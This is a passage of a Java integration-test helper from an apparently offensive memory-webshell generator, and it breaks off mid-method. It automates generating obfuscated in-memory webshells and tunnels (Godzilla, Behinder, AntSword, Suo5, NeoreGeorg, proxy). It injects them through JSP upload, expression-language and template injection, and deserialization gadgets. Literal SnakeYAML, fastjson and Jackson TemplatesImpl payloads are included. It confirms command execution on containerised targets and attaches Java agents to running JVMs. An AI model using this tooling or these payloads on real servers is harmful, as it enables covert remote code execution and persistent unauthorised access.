package com.reajason.javaweb.integration;

import com.reajason.javaweb.antsword.AntSwordManager;
import com.reajason.javaweb.behinder.BehinderManager;
import com.reajason.javaweb.godzilla.BlockingJavaWebSocketClient;
import com.reajason.javaweb.godzilla.GodzillaManager;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.PackerRegistry;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ObfuscationConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordConfig;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderConfig;
import com.reajason.javaweb.memshell.shelltool.command.CommandConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
import com.reajason.javaweb.memshell.shelltool.neoreg.NeoreGeorgConfig;
import com.reajason.javaweb.memshell.shelltool.proxy.ProxyConfig;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Config;
import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.JarPacker;
import com.reajason.javaweb.packer.JarPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.jar.*;
import com.reajason.javaweb.packer.jar.agent.AgentJarPacker;
import com.reajason.javaweb.packer.jar.agent.AgentJarWithJDKAttacherPacker;
import com.reajason.javaweb.packer.jar.agent.AgentJarWithJREAttacherPacker;
import com.reajason.javaweb.packer.translet.XalanAbstractTransletPacker;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.suo5.Suo5Manager;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import com.reajason.javaweb.utils.RandomUtils;
import com.reajason.javaweb.utils.StringUtils;
import com.reajason.javaweb.utils.tuple.Pair;
import org.hamcrest.Matchers;
import org.testcontainers.containers.Container;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.utility.MountableFile;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.Objects;

import static com.reajason.javaweb.memshell.ShellTool.*;
import static org.hamcrest.CoreMatchers.*;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2024/12/5
 */
@Slf4j
public class ShellAssertion {

    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, String packer) {
        return shellInjectIsOk(url, server, shellType, shellTool, targetJdkVersion, packer, (GenericContainer<?>) null);
    }

    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool,
                                                 int targetJdkVersion, String packer, String proxyTarget) {
        return shellInjectIsOk(url, server, null, shellType, shellTool, targetJdkVersion, packer,
                null, null, proxyTarget);
    }

    @SneakyThrows
    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, String packer, GenericContainer<?> container) {
        return shellInjectIsOk(url, server, shellType, shellTool, targetJdkVersion, packer, container, null);
    }

    @SneakyThrows
    public static Pair<String, String> getUrls(String url, String shellType, String shellTool, String packer) {
        String shellUrl = url + "/test";
        String urlPattern = null;
        if (shellType.endsWith(ShellType.SERVLET)
                || shellType.endsWith(ShellType.SPRING_WEBMVC_CONTROLLER_HANDLER)
                || shellType.equals(ShellType.SPRING_WEBFLUX_HANDLER_METHOD)
                || shellType.equals(ShellType.SPRING_WEBFLUX_HANDLER_FUNCTION)
                || shellType.equals(ShellType.ACTION)
        ) {
            urlPattern = "/" + shellTool + shellType + packer;
            shellUrl = url + urlPattern;
        }

        if (shellType.endsWith(ShellType.WEBSOCKET)) {
            urlPattern = "/" + shellTool + shellType + packer;
            URL url1 = new URL(url);
            shellUrl = "ws://" + url1.getHost() + ":" + url1.getPort() + url1.getPath() + urlPattern;
        }
        return Pair.of(shellUrl, urlPattern);
    }

    @SneakyThrows
    public static MemShellResult shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, String packer, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
        return shellInjectIsOk(url, server, null, shellType, shellTool, targetJdkVersion, packer, appContainer, pythonContainer);
    }

    @SneakyThrows
    public static MemShellResult shellInjectIsOk(String url, String server, String serverVersion, String shellType, String shellTool,
                                                 int targetJdkVersion, String packer,
                                                 GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
        return shellInjectIsOk(url, server, serverVersion, shellType, shellTool, targetJdkVersion, packer,
                appContainer, pythonContainer, null);
    }

    @SneakyThrows
    private static MemShellResult shellInjectIsOk(String url, String server, String serverVersion, String shellType, String shellTool,
                                                  int targetJdkVersion, String packer,
                                                  GenericContainer<?> appContainer, GenericContainer<?> pythonContainer,
                                                  String proxyTarget) {
        if (ShellTool.Proxy.equals(shellTool) && shellType.endsWith(ShellType.WEBSOCKET)) {
            return null;
        }
        Pair<String, String> urls = getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft();
        String urlPattern = urls.getRight();

        ShellToolConfig shellToolConfig = getShellToolConfig(shellType, shellTool, packer);

        MemShellResult generateResult = generate(urlPattern, server, serverVersion, shellType, shellTool, targetJdkVersion, shellToolConfig, packer);

        packerResultAndInject(generateResult, url, shellTool, shellType, packer, appContainer);

        assertShellIsOk(generateResult, shellUrl, shellTool, shellType, appContainer, pythonContainer, proxyTarget);

        return generateResult;
    }

    @SneakyThrows
    public static void packerResultAndInject(MemShellResult generateResult, String url, String shellTool, String shellType, String packer, GenericContainer<?> appContainer) {
        String content = null;
        if (PackerRegistry.getInstance().get(packer) instanceof AgentJarPacker ||
                PackerRegistry.getInstance().get(packer) instanceof AgentJarWithJREAttacherPacker ||
                PackerRegistry.getInstance().get(packer) instanceof AgentJarWithJDKAttacherPacker) {
            injectAgentJar(generateResult, shellTool, shellType, packer, appContainer);
            return;
        }
        if (PackerRegistry.getInstance().get(packer) instanceof ScriptEngineJarPacker) {
            byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            Files.deleteIfExists(tempJar);
            content = "!!javax.script.ScriptEngineManager [\n" +
                    "  !!java.net.URLClassLoader [[\n" +
                    "    !!java.net.URL [\"file://" + jarPath + "\"]\n" +
                    "  ]]\n" +
                    "]";
        } else if (PackerRegistry.getInstance().get(packer) instanceof GroovyTransformJarPacker) {
            byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            Files.deleteIfExists(tempJar);
            VulTool.postIsOk(url + "/fastjson", """
                    {
                      "@type":"java.lang.Exception",
                      "@type":"org.codehaus.groovy.control.CompilationFailedException",
                      "unit":{
                      }
                    }""");
            content = "{\n" +
                    "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                    "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                    "  \"config\":{\n" +
                    "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                    "    \"classpathList\":\"file://" + jarPath + "\"\n" +
                    "  }\n" +
                    "}";
        } else if (PackerRegistry.getInstance().get(packer) instanceof XalanAbstractTransletPacker) {
            String bytes = PackerRegistry.getInstance().get(packer).pack(ClassPackerConfig.from(generateResult));
            content = "[\"org.apache.xalan.xsltc.trax.TemplatesImpl\",{\"transletName\":\"businessObject\",\"transletBytecodes\":[\"" + bytes + "\"],\"outputProperties\":{}}]";
        } else {
            content = PackerRegistry.getInstance().pack(packer, generateResult);
        }
        injectIsOk(url, shellType, shellTool, content, packer, appContainer);
        log.info("send inject payload successfully");
    }

    private static void injectAgentJar(MemShellResult generateResult, String shellTool, String shellType, String packer, GenericContainer<?> appContainer) throws IOException, InterruptedException {
        if (PackerRegistry.getInstance().get(packer) instanceof AgentJarPacker) {
            byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            Files.deleteIfExists(tempJar);
            String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout().trim();
            assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
            String stdout = appContainer.execInContainer("/jattach", pidInContainer, "load", "instrument", "false", jarPath).getStdout();
            log.info("attach result: {}", stdout);
            assertThat(stdout, anyOf(
                    containsString("ATTACH_ACK"),
                    containsString("JVM response code = 0")
            ));
        } else if (PackerRegistry.getInstance().get(packer) instanceof AgentJarWithJREAttacherPacker || PackerRegistry.getInstance().get(packer) instanceof AgentJarWithJDKAttacherPacker) {
            byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            Files.deleteIfExists(tempJar);
            String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout();
            assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
            Container.ExecResult execResult = appContainer.execInContainer("java", "-jar", jarPath, pidInContainer);
            String stdout = execResult.getStdout();
            if (stdout.contains("executable file not found")) {
                execResult = appContainer.execInContainer("/opt/IBM/WebSphere/AppServer/java/bin/java", "-jar", jarPath, pidInContainer);
            }
            stdout = execResult.getStdout();
            System.out.println(stdout);
            System.out.println(execResult.getStderr());
            log.info("attach result: {}", stdout);
            assertThat(stdout, anyOf(
                    containsString("ok")
            ));
        }
    }


    @SneakyThrows
    public static void assertShellIsOk(MemShellResult generateResult, String shellUrl, String shellTool, String shellType, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
        assertShellIsOk(generateResult, shellUrl, shellTool, shellType, appContainer, pythonContainer, null);
    }

    @SneakyThrows
    private static void assertShellIsOk(MemShellResult generateResult, String shellUrl, String shellTool, String shellType,
                                        GenericContainer<?> appContainer, GenericContainer<?> pythonContainer, String proxyTarget) {
        switch (shellTool) {
            case GodzillaSession:
            case Godzilla:
                if (ShellType.UPGRADE.equals(shellType)) {
                    godzillaIsOk(shellUrl, ((GodzillaConfig) generateResult.getShellToolConfig()), generateResult.getShellClassName());
                } else {
                    godzillaIsOk(shellUrl, ((GodzillaConfig) generateResult.getShellToolConfig()));
                }
                break;
            case Command:
                String paramName = ((CommandConfig) generateResult.getShellToolConfig()).getParamName();
                if (ShellType.UPGRADE.equals(shellType)) {
                    String shellClassName = generateResult.getShellClassName();
                    OkHttpClient okHttpClient = new OkHttpClient();
                    HttpUrl url = Objects.requireNonNull(HttpUrl.parse(shellUrl))
                            .newBuilder()
                            .addQueryParameter(paramName, "id")
                            .build();
                    Request request = new Request.Builder()
                            .header("Connection", "Upgrade")
                            .header("Upgrade", shellClassName)
                            .url(url)
                            .get().build();
                    try (Response response = okHttpClient.newCall(request).execute()) {
                        String res = response.body().string();
                        System.out.println(res.trim());
                        assertTrue(res.contains("uid="));
                    }
                } else {
                    commandIsOk(shellUrl, shellType, paramName, "id");
                }
                break;
            case Behinder:
                behinderIsOk(shellUrl, ((BehinderConfig) generateResult.getShellToolConfig()));
                break;
            case Suo5:
                suo5IsOk(shellTool, shellUrl, ((Suo5Config) generateResult.getShellToolConfig()).getHeaderValue(), appContainer);
                break;
            case AntSword:
                antSwordIsOk(shellUrl, ((AntSwordConfig) generateResult.getShellToolConfig()));
                break;
            case Proxy:
                proxyIsOk(shellUrl, appContainer, ((ProxyConfig) generateResult.getShellToolConfig()), proxyTarget);
                break;
            case NeoreGeorg:
                neoreGeorgIsOk(appContainer, pythonContainer, shellUrl, ((NeoreGeorgConfig) generateResult.getShellToolConfig()));
                break;
        }
    }

    private static void proxyIsOk(String shellUrl, GenericContainer<?> appContainer, ProxyConfig config, String proxyTarget) throws Exception {
        URL url = new URL(shellUrl);
        String targetHost = "127.0.0.1";
        int targetPort;
        if (proxyTarget != null) {
            int separator = proxyTarget.lastIndexOf(':');
            if (separator <= 0 || separator == proxyTarget.length() - 1) {
                throw new IllegalArgumentException("proxyTarget must be host:port");
            }
            targetHost = proxyTarget.substring(0, separator);
            targetPort = Integer.parseInt(proxyTarget.substring(separator + 1));
        } else if (appContainer == null || appContainer.getExposedPorts().isEmpty()) {
            targetHost = url.getHost();
            targetPort = url.getPort() < 0 ? url.getDefaultPort() : url.getPort();
        } else {
            targetPort = appContainer.getExposedPorts().get(0);
        }

        String token = null;
        // Netty injection only affects new channels; never reuse a pre-injection keep-alive connection.
        OkHttpClient client = new OkHttpClient();
        Response pull = null;
        try {
            Request authorizeRequest = proxyRequest(config, shellUrl, "").get().build();
            try (Response authorize = client.newCall(authorizeRequest).execute()) {
                String authorization = authorize.body().string();
                assertTrue(authorize.code() == 200 && authorization.startsWith("token="),
                        "Proxy authorize failed: " + authorize.code() + " " + authorization);
                token = authorization.substring("token=".length());
            }

            String connect = "CONNECT " + targetHost + ":" + targetPort + " HTTP/1.1\r\n\r\n";
            assertTrue(proxyPush(client, shellUrl, token, config, connect.getBytes(StandardCharsets.ISO_8859_1)) == 200,
                    "Proxy CONNECT push failed");
            pull = client.newCall(proxyRequest(config, shellUrl, token).get().build()).execute();
            assertTrue(pull.code() == 200, "Proxy pull failed: " + pull.code());
            BufferedReader reader = new BufferedReader(new InputStreamReader(
                    pull.body().byteStream(), StandardCharsets.US_ASCII));
            String established = nextProxyLine(reader);
            assertTrue(established != null && new String(Base64.getDecoder().decode(established),
                            StandardCharsets.ISO_8859_1).startsWith("HTTP/1.1 200"),
                    "Proxy CONNECT was not established");

            String request = "GET / HTTP/1.1\r\nHost: " + targetHost + "\r\nConnection: close\r\n\r\n";
            assertTrue(proxyPush(client, shellUrl, token, config, request.getBytes(StandardCharsets.ISO_8859_1)) == 200,
                    "Proxy payload push failed");
            ByteArrayOutputStream targetResponse = new ByteArrayOutputStream();
            String line;
            while ((line = reader.readLine()) != null) {
                if (!line.isEmpty()) {
                    byte[] data = Base64.getDecoder().decode(line);
                    targetResponse.write(data, 0, data.length);
                    // The target may keep its connection open; a complete header block proves the response path.
                    if (targetResponse.toString("ISO-8859-1").contains("\r\n\r\n")) {
                        break;
                    }
                }
            }
            assertTrue(new String(targetResponse.toByteArray(), StandardCharsets.ISO_8859_1).contains("HTTP/"),
                    "Proxy target returned no HTTP response");
        } finally {
            if (pull != null) {
                pull.close();
            }
            if (token != null) {
                try {
                    proxyPush(client, shellUrl, token, config, new byte[0]);
                } catch (Throwable ignored) {
                }
            }
            client.connectionPool().evictAll();
        }
    }

    private static String nextProxyLine(BufferedReader reader) throws IOException {
        String line;
        while ((line = reader.readLine()) != null) {
            if (!line.isEmpty()) {
                return line;
            }
        }
        return null;
    }

    private static int proxyPush(OkHttpClient client, String shellUrl, String token, ProxyConfig config, byte[] data) throws IOException {
        RequestBody body = RequestBody.create(Base64.getEncoder().encode(data),
                MediaType.parse("application/octet-stream"));
        Request request = proxyRequest(config, shellUrl, token).post(body).build();
        try (Response response = client.newCall(request).execute()) {
            int code = response.code();
            if (code != 200) {
                throw new IOException("Proxy push failed: HTTP " + code + " " + response.body().string());
            }
            return code;
        }
    }

    private static Request.Builder proxyRequest(ProxyConfig config, String shellUrl, String token) {
        String endpoint = shellUrl + (shellUrl.contains("?") ? "&" : "?") + "token=" + token;
        return new Request.Builder().url(endpoint)
                .header("Connection", "close")
                .header(config.getHeaderName(), config.getHeaderValue());
    }

    private static void neoreGeorgIsOk(GenericContainer<?> container, GenericContainer<?> pythonContainer, String shellUrl, NeoreGeorgConfig shellToolConfig) throws Exception {
        URL url = new URL(shellUrl);
        shellUrl = "http://app:" + container.getExposedPorts().stream().findFirst().get() + url.getPath();
        String stdout = pythonContainer.execInContainer("python", "/app/neoreg.py", "-k", "key", "-H", shellToolConfig.getHeaderName() + ": " + shellUrl + "?" + shellToolConfig.getHeaderValue(), "-u", shellUrl).getStdout();
        log.info(stdout);
        assertTrue(stdout.contains("All seems fine"));
    }

    public static void godzillaIsOk(String entrypoint, GodzillaConfig shellConfig) {
        godzillaIsOk(entrypoint, shellConfig, null);
    }

    public static void godzillaIsOk(String entrypoint, GodzillaConfig shellConfig, String upgradeProtocol) {
        try (GodzillaManager godzillaManager = GodzillaManager.builder()
                .entrypoint(entrypoint).pass(shellConfig.getPass())
                .key(shellConfig.getKey()).header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue())
                .upgradeProtocol(upgradeProtocol).build()) {
            assertTrue(godzillaManager.start());
            assertTrue(godzillaManager.test());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @SneakyThrows
    public static void commandIsOk(String entrypoint, String shellType, String paramName, String payload) {
        if (shellType.endsWith(ShellType.WEBSOCKET)) {
            webSocketCommandIsOk(entrypoint, payload);
            return;
        }
        OkHttpClient okHttpClient = new OkHttpClient();
        HttpUrl url = Objects.requireNonNull(HttpUrl.parse(entrypoint))
                .newBuilder()
                .addQueryParameter(paramName, payload)
                .build();
        Request request = new Request.Builder()
                .url(url)
                .get().build();

        try (Response response = okHttpClient.newCall(request).execute()) {
            String res = response.body().string();
            System.out.println(res.trim());
            assertTrue(res.contains("uid="));
        }
    }

    @SneakyThrows
    public static void webSocketCommandIsOk(String entrypoint, String payload) {
        String response = BlockingJavaWebSocketClient.sendRequestWaitResponse(entrypoint, payload);
        assertTrue(response.contains("uid="));
    }

    public static void behinderIsOk(String entrypoint, BehinderConfig shellConfig) {
        BehinderManager behinderManager = BehinderManager.builder()
                .entrypoint(entrypoint).pass(shellConfig.getPass())
                .header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue()).build();
        assertTrue(behinderManager.test());
    }

    public static void suo5IsOk(String shellTool, String entrypoint, String headerValue) {
        assertTrue(Suo5Manager.test(shellTool, entrypoint, headerValue));
    }

    public static void suo5IsOk(String shellTool, String entrypoint, String headerValue, GenericContainer<?> appContainer) {
        if (appContainer == null || appContainer.getExposedPorts().isEmpty()) {
            suo5IsOk(shellTool, entrypoint, headerValue);
            return;
        }
        // 隧道服务端在容器内部，让它回连容器自身的应用端口验证数据面
        int internalPort = appContainer.getExposedPorts().get(0);
        assertTrue(Suo5Manager.test(shellTool, entrypoint, headerValue, "127.0.0.1", internalPort));
    }

    public static void antSwordIsOk(String entrypoint, AntSwordConfig shellConfig) {
        AntSwordManager antSwordManager = AntSwordManager.builder()
                .entrypoint(entrypoint)
                .pass(shellConfig.getPass())
                .header(shellConfig.getHeaderName(), shellConfig.getHeaderValue())
                .build();
        assertTrue(antSwordManager.getInfo().contains("ok"));
    }

    public static ShellToolConfig getShellToolConfig(String shellType, String shellTool, String packer) {
        ShellToolConfig shellToolConfig = null;
        String uniqueName = shellTool + RandomUtils.randomAlphabetic(5) + shellType + RandomUtils.randomAlphabetic(5) + packer;
        switch (shellTool) {
            case GodzillaSession:
            case Godzilla:
                String godzillaPass = "pass";
                String godzillaKey = "key";
                shellToolConfig = GodzillaConfig.builder()
                        .pass(godzillaPass).key(godzillaKey)
                        .headerName("User-Agent").headerValue(uniqueName)
                        .build();
                log.info("generated {} godzilla with pass: {}, key: {}, User-Agent: {}", shellType, godzillaPass, godzillaKey, uniqueName);
                break;
            case Command:
                shellToolConfig = CommandConfig.builder()
                        .paramName(uniqueName)
                        .build();
                log.info("generated {} command shell with paramName: {}", shellType, uniqueName);
                break;
            case Behinder:
                String behinderPass = "pass";
                shellToolConfig = BehinderConfig.builder()
                        .pass(behinderPass)
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} behinder with pass: {}, User-Agent: {}", shellType, behinderPass, uniqueName);
                break;
            case Suo5:
                shellToolConfig = Suo5Config.builder()
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} suo5 with User-Agent: {}", shellType, uniqueName);
                break;
            case AntSword:
                String antPassword = "ant";
                shellToolConfig = AntSwordConfig.builder()
                        .pass(antPassword)
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} antSword with pass: {}, User-Agent: {}", shellType, antPassword, uniqueName);
                break;
            case NeoreGeorg:
                shellToolConfig = NeoreGeorgConfig.builder()
                        .headerName("Referer")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} NeoreGeorg with Referer: {}", shellType, uniqueName);
                break;
            case Proxy:
                shellToolConfig = ProxyConfig.builder()
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} proxy with User-Agent: {}", shellType, uniqueName);
                break;
        }
        return shellToolConfig;
    }

    public static MemShellResult generate(String urlPattern, String server, String serverVersin, String shellType, String shellTool, int targetJdkVersion, ShellToolConfig shellToolConfig, String packer) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .serverVersion(serverVersin)
                .shellTool(shellTool)
                .shellType(shellType)
                .targetJreVersion(targetJdkVersion)
                .byPassJavaModule(targetJdkVersion >= Opcodes.V9)
                .debug(true)
                .shrink(true)
                .lambdaSuffix(true)
                .obfuscation(ObfuscationConfig.enabled())
                .build();
        InjectorConfig injectorConfig = InjectorConfig.builder().staticInitialize(true).build();
        if (StringUtils.isNotBlank(urlPattern)) {
            injectorConfig.setUrlPattern(urlPattern);
        }
        Packer packerInstance = PackerRegistry.getInstance().get(packer);
        if (packerInstance.requiresSpringExpressionPackage()) {
            injectorConfig.setInjectorClassName(packerInstance.generateSpringExpressionClassName());
        }
        if (packerInstance.requiresSpringExpressionPackage() || packerInstance.transportedAsSpelExpression()) {
            // SpEL 表达式长度上限 10000 字符，混淆后的注入器放不下；JDK17 系还要求注入器
            // 位于 org.springframework.expression 包下，同样不能改名
            shellConfig.setObfuscation(ObfuscationConfig.defaults());
        }
        return new MemShellGenerator().generate(shellConfig, injectorConfig, shellToolConfig);
    }

    public static void injectIsOk(String url, String shellType, String shellTool, String content, String packer, GenericContainer<?> container) {
        switch (packer) {
            case Packers.JSP, Packers.ClassLoaderJSP, Packers.ClassLoaderJSPUnicode, Packers.DefineClassJSP, Packers.DefineClassJSPUnicode -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + packer + ".jsp";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case Packers.JSPX, Packers.JSPXUnicode -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + packer + ".jspx";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case Packers.ScriptEngine, Packers.DefaultScriptEngine, Packers.ScriptEngineNoSquareBrackets, Packers.ScriptEngineBigInteger ->
                    VulTool.postIsOk(url + "/js", content);
            case Packers.EL -> VulTool.postIsOk(url + "/el", content);
            case Packers.SpEL, Packers.SpELSpringGzip, Packers.SpELScriptEngine, Packers.SpELSpringGzipJDK17 ->
                    VulTool.postIsOk(url + "/spel", content);
            case Packers.OGNLSpringGzip, Packers.OGNLScriptEngine, Packers.OGNLSpringGzipJDK17 -> VulTool.postIsOk(url + "/ognl", content);
            case Packers.MVEL -> VulTool.postIsOk(url + "/mvel", content);
            case Packers.JXPath, Packers.JXPathScriptEngine, Packers.JXPathSpringGzip, Packers.JXPathSpringGzipJDK17 ->
                    VulTool.postIsOk(url + "/jxpath", content);
            case Packers.JEXL -> VulTool.postIsOk(url + "/jexl2", content);
            case Packers.Aviator -> VulTool.postIsOk(url + "/aviator", content);
            case Packers.Groovy -> VulTool.postIsOk(url + "/groovy", content);
            case Packers.Rhino -> VulTool.postIsOk(url + "/rhino", content);
            case Packers.BeanShell -> VulTool.postIsOk(url + "/bsh", content);
            case Packers.JinJava -> VulTool.postIsOk(url + "/jinjava", content);
            case Packers.Freemarker, Packers.FreemarkerScriptEngine, Packers.FreemarkerSpELSpringGzip, Packers.FreemarkerSpELSpringGzipJDK17 -> VulTool.postIsOk(url + "/freemarker", content);
            case Packers.Velocity -> VulTool.postIsOk(url + "/velocity", content);
            case Packers.JavaDeserialize -> VulTool.postIsOk(url + "/java_deserialize", content);
            case Packers.JavaCommonsBeanutils16 -> VulTool.postIsOk(url + "/java_deserialize/cb161", content);
            case Packers.JavaCommonsBeanutils17 -> VulTool.postIsOk(url + "/java_deserialize/cb170", content);
            case Packers.JavaCommonsBeanutils18 -> VulTool.postIsOk(url + "/java_deserialize/cb183", content);
            case Packers.JavaCommonsBeanutils19 -> VulTool.postIsOk(url + "/java_deserialize/cb194", content);
            case Packers.JavaCommonsBeanutils110 -> VulTool.postIsOk(url + "/java_deserialize/cb110", content);
            case Packers.JavaCommonsCollections3 -> VulTool.postIsOk(url + "/java_deserialize/cc321", content);
            case Packers.JavaCommonsCollections4 -> VulTool.postIsOk(url + "/java_deserialize/cc40", content);
            case Packers.HessianDeserialize -> VulTool.postIsOk(url + "/hessian", content);
            case Packers.Hessian2Deserialize -> VulTool.postIsOk(url + "/hessian2", content);
            case Packers.ScriptEngineJar -> VulTool.postIsOk(url + "/snakeYaml", content);
            case Packers.GroovyTransformJar -> VulTool.postIsOk(url + "/fastjson", content);
            case Packers.XMLDecoderScriptEngine, Packers.XMLDecoderDefineClass -> VulTool.postIsOk(url + "/xmlDecoder", content);
            case Packers.XSLT, Packers.XSLTScriptEngine -> VulTool.postIsOk(url + "/xslt", content);
            case Packers.DefaultBase64 -> VulTool.postIsOk(url + "/b64", content);
            case Packers.FilelessAgent -> VulTool.postRawIsOk(url + "/b64", content);
            case Packers.BigInteger -> VulTool.postIsOk(url + "/biginteger", content);
            case Packers.XxlJob -> VulTool.xxlJobExecutor(url + "/run", content);
            case Packers.XxlJobHessian -> VulTool.xxlJobHessianExecutor(url + "/", content);
            case Packers.H2, Packers.H2JS, Packers.H2Javac, Packers.H2JSURLEncode -> VulTool.postIsOk(url + "/jdbc", content);
            case Packers.XalanAbstractTransletPacker -> VulTool.postIsOk(url + "/jackson", content);
            default -> throw new IllegalStateException("Unexpected value: " + packer);
        }
    }

    public static void testProbeInject(String url, String server, String serverVersion, String shellType, int targetJdkVersion) {
        String shellTool = ShellTool.Command;
        String packer = Packers.BigInteger;
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft();
        String urlPattern = urls.getRight();
        if (urlPattern != null) {
            shellUrl += "testProbe";
            urlPattern += "testProbe";
        }
        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .serverVersion(serverVersion)
                .shellType(shellType)
                .shellTool(shellTool)
                .targetJreVersion(targetJdkVersion)
                .debug(true)
                .probe(ProbeConfig.builder()
                        .probeMethod(ProbeMethod.ResponseBody)
                        .probeContent(ProbeContent.Bytecode)
                        .build())
                .lambdaSuffix(true)
                .obfuscation(ObfuscationConfig.enabled())
                .build();
        InjectorConfig injectorConfig = InjectorConfig.builder()
                .urlPattern(urlPattern)
                .staticInitialize(true)
                .build();
        String paramName = "tomcatProbe" + shellType;
        CommandConfig commandConfig = CommandConfig.builder()
                .paramName(paramName)
                .build();
        MemShellResult generateResult = new MemShellGenerator().generate(shellConfig, injectorConfig, commandConfig);
        String content = PackerRegistry.getInstance().get(packer).pack(ClassPackerConfig.from(generateResult));
        String res = VulTool.postIsOk(url + "/biginteger", content);
        assertThat(res, anyOf(
                Matchers.containsString("context: "),
                Matchers.containsString("server: "),
                Matchers.containsString("channel: "),
                Matchers.containsString("namespace: ")

        ));
        ShellAssertion.commandIsOk(shellUrl, shellType, paramName, "id");
    }

    public static void testProbeInject(String url, String server, String shellType, int targetJdkVersion) {
        testProbeInject(url, server, null, shellType, targetJdkVersion);
    }

    public static void assertFilterProbeIsRight(String filterInfos) {
        assertThat(filterInfos, allOf(
                containsString("urlMappingTestFilter -> UrlMappingTestFilter -> URL:[/b64, /test]"),
                containsString("servletNameTestFilter -> ServletNameTestFilter -> Servlet:[b64, biginteger]")
        ));
    }

    @SneakyThrows
    public static void testListProcessAndAttachAll(String url, ContainerTestConfig config, String shellType, GenericContainer<?> appContainer) {
        String shellTool = ShellTool.Command;
        String packer = Packers.AgentJarWithJREAttacher;
        Pair<String, String> urls = getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft();
        String urlPattern = urls.getRight();

        ShellToolConfig shellToolConfig = getShellToolConfig(shellType, shellTool, packer);
        MemShellResult generateResult = generate(urlPattern, config.getServer(), config.getServerVersion(),
